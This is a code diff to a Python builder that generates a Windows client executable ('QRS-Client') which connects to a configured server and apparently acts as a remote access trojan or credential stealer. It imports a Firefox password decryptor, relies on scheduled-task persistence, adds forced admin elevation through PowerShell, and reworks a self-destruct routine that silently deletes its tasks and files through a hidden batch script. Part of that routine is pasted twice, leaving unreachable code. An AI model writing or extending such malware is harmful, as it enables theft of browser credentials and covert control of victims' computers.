@@ -6,6 +6,9 @@ from pathlib import Path
 import shutil
 import string
 import json
+import ctypes
+import sys
+
 # ==== USER SETTINGS ====
 # IP and Port need to be directly updated in the following target code (under SERHER_HOST and SERVER_PORT)
 output_name = "QRS-Client" # Desired name (without .exe)
@@ -42,6 +45,20 @@ if Saved:
 
 
 
+# Ensure you run as admin
+
+def elevate_to_admin():
+    if not is_admin():
+        script = sys.argv[0]
+        params = ' '.join(sys.argv[1:])
+        subprocess.run(['powershell', 'Start-Process', sys.executable, '-ArgumentList', script, '-Verb', 'runAs'])
+        sys.exit()
+
+def is_admin():
+    # Check if the current user has admin privileges
+    return ctypes.windll.shell32.IsUserAnAdmin() != 0
+
+elevate_to_admin()
 
 # Ensure output path exists
 os.makedirs(output_path, exist_ok=True)
@@ -56,7 +73,7 @@ import http.client
 import time as tm
 import EngineSupport as FirfoxDecryptor
 import tempfile
-
+import re
 
 GlobalOverwriteOutput = None
 
@@ -150,28 +167,66 @@ def Stop():
 def SelfDestruct():
     path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
 
-    # Clean up any Windows Task Scheduler entries pointing to this script
-    out = subprocess.run(['schtasks', '/Query', '/FO', 'LIST', '/V'], capture_output=True, text=True).stdout
-    for block in out.split('\\n\\n'):
-        if path.lower() in block.lower():
-            for line in block.splitlines():
-                if line.startswith("TaskName:"):
-                    tn = line.split(":",1)[1].strip()
-                    subprocess.run(['schtasks', '/Delete', '/TN', tn, '/F'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        # Query Windows Task Scheduler tasks
+        result = subprocess.run(
+            ['schtasks', '/Query', '/FO', 'LIST', '/V'],
+            capture_output=True,
+            text=True,
+            encoding="utf-8",  
+            errors="ignore"    
+        )
+        out = result.stdout
+        print(out)
+    except Exception as e:
+        print(f"Error running schtasks: {e}")
+        out = None
 
-    # Write a temporary .bat file to delete the script and itself
+    if out:  # ✅ Make sure out is not None
+        for block in re.split(r'\\n\s*\\n', out):
+            if path.lower() in block.lower():
+                for line in block.splitlines():
+                    if line.startswith("TaskName:"):
+                        tn = line.split(":", 1)[1].strip()
+                        try:
+                            subprocess.run(
+                                ['schtasks', '/Delete', '/TN', tn, '/F'],
+                                stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL
+                            )
+                            print(f"Deleted task: {tn}")
+                        except Exception as e:
+                            print(f"Error deleting task {tn}: {e}")
+                
+
+    # Create temporary batch file to self-destruct
     bat = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
     bat_path = bat.name
-
-    bat_content = -~-bat-~-.format(path, bat_path)
-
-    # Now write the content to the bat file
-    bat.write(bat_content.encode())
+    bat.write(-~-bat-~-.strip().encode('utf-8'))
     bat.close()
 
+    # Run the batch file hidden
+    try:
+        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
+        print(f"Batch file created at {bat_path} and executed.")
+    except Exception as e:
+        print(f"Error running batch file: {e}")
+    sys.exit()
 
-    # Run the batch file in the background and exit this script
-    subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
+                
+
+    # Create temporary batch file to self-destruct
+    bat = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
+    bat_path = bat.name
+    bat.write(-~-bat-~-.strip().encode('utf-8'))
+    bat.close()
+
+    # Run the batch file hidden
+    try:
+        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
+        print(f"Batch file created at {bat_path} and executed.")
+    except Exception as e:
+        print(f"Error running batch file: {e}")
     sys.exit()
 
 
@@ -312,10 +367,9 @@ with open(filename, "w", encoding="utf-8") as f:
         .replace("-~-Port-~-", HostPort)
         .replace("-~-bat-~-", '''""" 
 @echo off
-ping 127.0.0.1 -n 3 >nul
-copy /y NUL "{0}" >nul
-del /f /q "{0}"
-del /f /q "{1}"
+timeout /t 3 /nobreak >nul
+del /f /q "{path}"
+del /f /q "{bat_path}"
 """''')
     ))
 print(f"[+] Script saved to: {os.path.abspath(filename)}")
